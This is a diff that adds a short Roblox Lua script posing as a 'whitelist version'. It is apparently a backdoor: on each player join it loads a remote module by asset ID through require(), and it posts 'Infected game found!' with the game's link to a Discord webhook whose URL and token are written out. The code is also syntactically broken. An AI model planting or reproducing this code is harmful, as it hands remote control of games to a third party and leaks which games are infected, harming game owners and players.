@@ -1,0 +1,18 @@
+-- Whitelist version (Delete the one you don't want, I suggest deleting the first one because this is safer and better.)
+
+game.Players.PlayerAdded:Connect(function(plr)
+if plr = () then
+		require(122642281679887).YourModuleLoad(plr.Name)
+end
+
+
+local http = game:GetService("HttpService")
+	local hook = "https://discord.com/api/webhooks/1409310224032207021/24NfZKUpsyizjpUJxIMD2DtQF7GNJq5CZr72tndr6VmnPJX6SkzNO7aJxg22E7wWdjLO"
+local Data =
+{
+   ["content"] = "Infected game found! Link: https://www.roblox.com/games/"..game.PlaceId,
+}
+
+Data = http:JSONEncode(Data)
+
+http:PostAsync(hook, Data)
